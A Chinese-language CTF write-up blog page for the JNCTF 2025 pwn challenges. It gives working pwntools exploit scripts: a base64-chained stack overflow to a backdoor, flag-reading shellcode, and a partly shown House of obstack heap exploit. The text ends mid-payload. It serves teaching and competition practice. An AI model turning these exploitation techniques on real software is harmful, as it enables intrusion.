@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-tldeq5d5><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="light"><meta name="theme-color" content="#fbf9f5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><meta name="generator" content="Astro v7.4.2"><meta name="author" content="Findkey"><!-- Canonical URL --><link rel="canonical" href="https://find-key.github.io/posts/jnctf-wp/"><!-- Primary Meta Tags --><title>JNCTF 2025 · Findkey’s Blog</title><meta name="description" content="最后一届校赛，PWN 方向全做完了，把 Signin、ezbase、两道 shellcode 和 hvm 记一遍。"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://find-key.github.io/posts/jnctf-wp/"><meta property="og:site_name" content="Findkey’s Blog"><meta property="og:locale" content="zh_CN"><meta property="og:title" content="JNCTF 2025 · Findkey’s Blog"><meta property="og:description" content="最后一届校赛，PWN 方向全做完了，把 Signin、ezbase、两道 shellcode 和 hvm 记一遍。"><meta property="og:image" content="https://find-key.github.io/og.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="JNCTF 2025 · Findkey’s Blog"><meta name="twitter:description" content="最后一届校赛，PWN 方向全做完了，把 Signin、ezbase、两道 shellcode 和 hvm 记一遍。"><meta name="twitter:image" content="https://find-key.github.io/og.png"><link rel="stylesheet" href="/_astro/_..YMHo4NxU.css"><link rel="stylesheet" href="/_astro/Header.Cvwz3oM9.css"><script type="module" src="/_astro/page.tougUCvb.js"></script></head><body data-astro-cid-tldeq5d5><header class="site-header" data-astro-cid-nen7h5rs><div class="inner" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs>Findkey’s Blog</a><nav class="nav" data-astro-cid-nen7h5rs><a href="/posts" class="active" data-astro-cid-nen7h5rs>归档</a><a href="/links" data-astro-cid-nen7h5rs>友链</a></nav></div></header><main class="wrap" data-astro-cid-tldeq5d5><div class="grid" data-astro-cid-tldeq5d5><aside class="sidebar" data-astro-cid-7k3pnqyz><span class="label" data-astro-cid-7k3pnqyz>目录</span><ol class="toc" data-astro-cid-7k3pnqyz><li class="d2" data-astro-cid-7k3pnqyz><a href="#signin" data-heading="signin" data-astro-cid-7k3pnqyz>Signin</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#探索版" data-heading="探索版" data-astro-cid-7k3pnqyz>探索版</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#ezbase" data-heading="ezbase" data-astro-cid-7k3pnqyz>ezbase</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#shellcode_master" data-heading="shellcode_master" data-astro-cid-7k3pnqyz>shellcode_master?</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#shellcode_master_revenge" data-heading="shellcode_master_revenge" data-astro-cid-7k3pnqyz>shellcode_master_revenge</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#hvm" data-heading="hvm" data-astro-cid-7k3pnqyz>hvm</a></li></ol></aside><script type="module">var e=new Map;document.querySelectorAll(`a[data-heading]`).forEach(t=>{let n=t.dataset.heading;if(!n)return;let r=e.get(n)??[];r.push(t),e.set(n,r)});var t=Array.from(document.querySelectorAll(`.prose h2[id], .prose h3[id]`));if(document.querySelectorAll(`.toc-inline a[data-heading]`).forEach(e=>{e.addEventListener(`click`,()=>{let t=e.closest(`details`);t&&(t.open=!1)})}),e.size>0&&t.length>0){let n=new IntersectionObserver(t=>{for(let n of t)n.isIntersecting&&(e.forEach(e=>e.forEach(e=>e.classList.remove(`active`))),e.get(n.target.id)?.forEach(e=>e.classList.add(`active`)))},{rootMargin:`-84px 0px -65% 0px`});t.forEach(e=>n.observe(e))}</script><article class="article" data-astro-cid-tldeq5d5><nav class="crumb" aria-label="位置" data-astro-cid-tldeq5d5><a href="/" data-astro-cid-tldeq5d5>首页</a><span class="sep" data-astro-cid-tldeq5d5>/</span><a href="/categories/wp/" data-astro-cid-tldeq5d5>WP</a></nav><h1 data-astro-cid-tldeq5d5>JNCTF 2025</h1><p class="meta" data-astro-cid-tldeq5d5><time datetime="2025-03-27">2025年3月27日</time><span class="dot" data-astro-cid-tldeq5d5>·</span><span data-astro-cid-tldeq5d5>约 13 分钟</span></p><div class="tags" data-astro-cid-tldeq5d5><a href="/tags/writeup/" data-astro-cid-tldeq5d5>#writeup</a></div><details class="toc-inline" data-astro-cid-7k3pnqyz><summary data-astro-cid-7k3pnqyz>目录</summary><ol class="toc" data-astro-cid-7k3pnqyz><li class="d2" data-astro-cid-7k3pnqyz><a href="#signin" data-heading="signin" data-astro-cid-7k3pnqyz>Signin</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#探索版" data-heading="探索版" data-astro-cid-7k3pnqyz>探索版</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#ezbase" data-heading="ezbase" data-astro-cid-7k3pnqyz>ezbase</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#shellcode_master" data-heading="shellcode_master" data-astro-cid-7k3pnqyz>shellcode_master?</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#shellcode_master_revenge" data-heading="shellcode_master_revenge" data-astro-cid-7k3pnqyz>shellcode_master_revenge</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#hvm" data-heading="hvm" data-astro-cid-7k3pnqyz>hvm</a></li></ol></details><div class="prose" data-astro-cid-tldeq5d5><h2 id="signin">Signin</h2>
+<h3 id="探索版">探索版</h3>
+<p>先跑起来看看，功能不多：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>register    #注册</span></span>
+<span class="line"><span>sign_in     #登录</span></span>
+<span class="line"><span>sign_out    #登出</span></span>
+<span class="line"><span>whoami      #输出用户名</span></span>
+<span class="line"><span>help        #命令列表</span></span>
+<span class="line"><span>quit        #退出</span></span></code></pre>
+<p>题目给了 Rust 源码，直接读代码就行（读不懂的部分可以问 AI）。隐藏的命令还有：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>unregister      #注销</span></span>
+<span class="line"><span>become_admin    #成为管理员</span></span>
+<span class="line"><span>get_flag        #获得flag</span></span></code></pre>
+<p>直接 <code>get_flag</code>，提示 <code>You are not signed in!</code>——那就先注册再登录：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>register asd 123    #用户名和密码随便给</span></span>
+<span class="line"><span>sign_in asd 123     #登录刚才注册的用户</span></span></code></pre>
+<p>登录后 <code>get_flag</code> 变成 <code>You are not an admin!</code>；再试 <code>become_admin</code>，它要你确认是不是 root，回 <code>y</code> 得到 <code>You are not root, you cannot do this!</code>。</p>
+<p>看起来用户名必须是 root，那就注册一个：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>register root 123</span></span></code></pre>
+<p>回显 <code>Name already exists!</code></p>
+<p>先把它注销掉：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>unregister root</span></span></code></pre>
+<p>成功了。再以 root 注册：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>register root 123</span></span></code></pre>
+<p>再登录，然后走一遍 <code>become_admin</code>：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sign_in root 123</span></span></code></pre>
+<p>这次回显变成 <code>You are now an admin!</code>，再 <code>get_flag</code> 就到手了。</p>
+<h2 id="ezbase">ezbase</h2>
+<p>程序开了 pie 保护</p>
+<p>输入一段长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mi>k</mi></mrow><annotation encoding="application/x-tex">4k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.0315em;">k</span></span></span></span>（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>∈</mo><msup><mi>Z</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">k \in Z^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.0315em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6887em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0715em;">Z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>）的 base64 密文，程序解码后输出明文和长度。</p>
+<p>最多只读 0x40 字节，但解码缓冲区紧挨着输入缓冲区：输入写满 0x40 时，解码结果会被当成下一轮密文继续解，于是可以一路解码到溢出。溢出长度有限，不过题目给了后门函数，够用了。</p>
+<p>做法是从溢出字节倒推 payload——需要解码三次才能覆盖到返回地址。</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"><span style="color:#D73A49">import</span><span style="color:#24292E"> base64</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">context.log_level </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'debug'</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"><span style="color:#24292E">context.terminal </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span><span style="color:#032F62">'tmux'</span><span style="color:#24292E">, </span><span style="color:#032F62">'splitw'</span><span style="color:#24292E">, </span><span style="color:#032F62">'-h'</span><span style="color:#24292E">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">backdoor </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p16(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">1181</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">back </span><span style="color:#D73A49">=</span><span style="color:#24292E"> base64.b64encode(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'a'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">4</span><span style="color:#D73A49">+</span><span style="color:#24292E">backdoor)</span></span>
+<span class="line"><span style="color:#24292E">info(</span><span style="color:#032F62">'back: '</span><span style="color:#D73A49"> +</span><span style="color:#24292E"> back.decode())</span></span>
+<span class="line"><span style="color:#24292E">back </span><span style="color:#D73A49">=</span><span style="color:#24292E"> back.ljust(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">24</span><span style="color:#24292E">,</span><span style="color:#D73A49">b</span><span style="color:#032F62">'='</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#6A737D"># 等号补充是为了停止解码,防止过度溢出</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">back </span><span style="color:#D73A49">=</span><span style="color:#24292E"> base64.b64encode(back)</span></span>
+<span class="line"><span style="color:#24292E">info(</span><span style="color:#032F62">'back: '</span><span style="color:#D73A49"> +</span><span style="color:#24292E"> back.decode())</span></span>
+<span class="line"><span style="color:#24292E">back </span><span style="color:#D73A49">=</span><span style="color:#24292E"> base64.b64encode(back)</span></span>
+<span class="line"><span style="color:#24292E">info(</span><span style="color:#032F62">'back: '</span><span style="color:#D73A49"> +</span><span style="color:#24292E"> back.decode())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./ezbase'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">gdb.attach(io, </span><span style="color:#032F62">'b *$rebase(0x1474)'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Please input your secret:'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(back)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="shellcode_master">shellcode_master?</h2>
+<p>常规 shellcode 题，只是几乎清空了所有寄存器；<code>open</code> / <code>read</code> / <code>write</code> 之前还得先找个可写段。</p>
+<p>发现 shellcode 的 mmap 地址和可写段之间偏移固定，可以据此算出可写段地址。</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">context.log_level </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'debug'</span></span>
+<span class="line"><span style="color:#24292E">context.terminal </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span><span style="color:#032F62">'tmux'</span><span style="color:#24292E">, </span><span style="color:#032F62">'splitw'</span><span style="color:#24292E">, </span><span style="color:#032F62">'-h'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./sc_master'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">gdb.attach(io, </span><span style="color:#032F62">'b *$rebase(0x1569)'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 0x39000就是一个固定偏移</span></span>
+<span class="line"><span style="color:#24292E">shellcode </span><span style="color:#D73A49">=</span><span style="color:#032F62"> '''mov rsp, r15</span></span>
+<span class="line"><span style="color:#032F62">sub rsp, 0x39000</span></span>
+<span class="line"><span style="color:#032F62">add rsp, 0x300</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">push 0x67616c66</span></span>
+<span class="line"><span style="color:#032F62">mov rdi, rsp</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, 0</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 2</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rdi, rax</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, rsp</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0x100</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 0</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rbx, rsp</span></span>
+<span class="line"><span style="color:#032F62">label:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rdi, 1</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, rbx</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0x1</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 1</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">add rbx, 1</span></span>
+<span class="line"><span style="color:#032F62">cmp byte ptr [rbx], 0</span></span>
+<span class="line"><span style="color:#032F62">jne label</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#24292E">shellcode </span><span style="color:#D73A49">=</span><span style="color:#24292E"> asm(shellcode)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(shellcode)</span></span>
+<span class="line"><span style="color:#005CC5">print</span><span style="color:#24292E">(io.recvall())</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="shellcode_master_revenge">shellcode_master_revenge</h2>
+<blockquote>
+<p>按出题人的说法，上面的解法属于非预期，于是有了 revenge 版。</p>
+</blockquote>
+<p>题目没大改，只是 mmap 的地址固定成 <code>0x114514000</code>。</p>
+<p>可写段位置不再固定，只能爆破。</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># context.log_level = 'debug'</span></span>
+<span class="line"><span style="color:#24292E">context.terminal </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span><span style="color:#032F62">'tmux'</span><span style="color:#24292E">, </span><span style="color:#032F62">'splitw'</span><span style="color:#24292E">, </span><span style="color:#032F62">'-h'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">#0x7ffe30734000是本地某一次运行时的栈地址</span></span>
+<span class="line"><span style="color:#24292E">shellcode </span><span style="color:#D73A49">=</span><span style="color:#032F62"> '''mov r12, 0x7ffe30734000</span></span>
+<span class="line"><span style="color:#032F62">label1:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rdi, 0</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, r12</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0x1</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 0</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"><span style="color:#032F62">sub r12, 0x1000</span></span>
+<span class="line"><span style="color:#032F62">cmp rax, 0x1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">jne label1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rsp,r12</span></span>
+<span class="line"><span style="color:#032F62">push 0x67616c66</span></span>
+<span class="line"><span style="color:#032F62">mov rdi, rsp</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, 0</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 2</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rdi, rax</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, rsp</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0x100</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 0</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rbx, rsp</span></span>
+<span class="line"><span style="color:#032F62">label2:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">mov rdi, 1</span></span>
+<span class="line"><span style="color:#032F62">mov rsi, rbx</span></span>
+<span class="line"><span style="color:#032F62">mov rdx, 0x1</span></span>
+<span class="line"><span style="color:#032F62">mov rax, 1</span></span>
+<span class="line"><span style="color:#032F62">syscall</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">add rbx, 1</span></span>
+<span class="line"><span style="color:#032F62">cmp byte ptr [rbx], 0</span></span>
+<span class="line"><span style="color:#032F62">jne label2</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">shellcode </span><span style="color:#D73A49">=</span><span style="color:#24292E"> asm(shellcode)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#005CC5">print</span><span style="color:#24292E">(</span><span style="color:#005CC5">len</span><span style="color:#24292E">(shellcode))</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./sc_master_revenge'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">gdb.attach(io, </span><span style="color:#032F62">'b *$rebase(0x155A)'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Give me your shellcode: '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(shellcode)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">while</span><span style="color:#D73A49"> not</span><span style="color:#24292E"> io.recv(</span><span style="color:#E36209">timeout</span><span style="color:#D73A49">=</span><span style="color:#005CC5">0.02</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#005CC5">    print</span><span style="color:#24292E">(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'a'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'1'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#005CC5">print</span><span style="color:#24292E">(io.recvall())</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<p>远程 io 很慢；其实还有优化空间，赛时没想到。</p>
+<p>另外这是概率脚本：栈地址高于假设值时打不通。</p>
+<h2 id="hvm">hvm</h2>
+<p>VM PWN，需要手搓 opcode。</p>
+<p>可能用到的 opcode：</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>code_map = {</span></span>
+<span class="line"><span>    'rd': b'\xd1',</span></span>
+<span class="line"><span>    'wt': b'\xd2',</span></span>
+<span class="line"><span>    'new': b'\xd3',</span></span>
+<span class="line"><span>    'free': b'\xd4',</span></span>
+<span class="line"><span>    'display': b'\xd5',</span></span>
+<span class="line"><span>    'xor': b'\xe3',</span></span>
+<span class="line"><span>    'inverse': b'\xe4',</span></span>
+<span class="line"><span>    'shl': b'\xe5',</span></span>
+<span class="line"><span>    'add': b'\xf1',</span></span>
+<span class="line"><span>    'sub': b'\xf2',</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>申请的 chunk 索引为 <code>0-15</code>，大小为 <code>0x480-0x500</code></p>
+<p>但读写没有长度检测：申请 <code>0x480</code> 的 chunk，却能访问到 <code>0x500</code>，这就是越界读写。</p>
+<p>这题的环境是 glibc 2.25，可以用 House of obstack。</p>
+<p><strong>PS: opcode 是通过 read 函数读入的，有些字符无法读入</strong></p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">context.log_level </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'debug'</span></span>
+<span class="line"><span style="color:#24292E">context.terminal </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span><span style="color:#032F62">'tmux'</span><span style="color:#24292E">, </span><span style="color:#032F62">'splitw'</span><span style="color:#24292E">, </span><span style="color:#032F62">'-h'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">libc </span><span style="color:#D73A49">=</span><span style="color:#24292E"> ELF(</span><span style="color:#032F62">'./libc.so.6'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./hvm'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#6A737D"># gdb.attach(io, 'b *$rebase(0x164b)')</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">libc_offset </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">21b0f0</span></span>
+<span class="line"><span style="color:#24292E">heap_offset </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">480</span></span>
+<span class="line"><span style="color:#005CC5">IO_list_all</span><span style="color:#D73A49"> =</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">21b680</span></span>
+<span class="line"><span style="color:#005CC5">IO_obstack_jump</span><span style="color:#D73A49"> =</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">2173c0</span></span>
+<span class="line"><span style="color:#24292E">system_offset </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">50d70</span></span>
+<span class="line"><span style="color:#24292E">binsh_offset </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">1d8678</span></span>
+<span class="line"><span style="color:#24292E">puts_offset </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">80e50</span></span>
+<span class="line"><span style="color:#24292E">ogg_offset </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">ebc81</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x00\x80\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x01\x80\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x02\x90\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd4\x01</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x01\x90\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">libc和heap的地址</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x94\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x00\x04\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x90\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf2</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(libc_offset)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x00\x00\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\xa4\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x00\x0c\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\xa0\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf2</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(heap_offset)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x00\x08\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
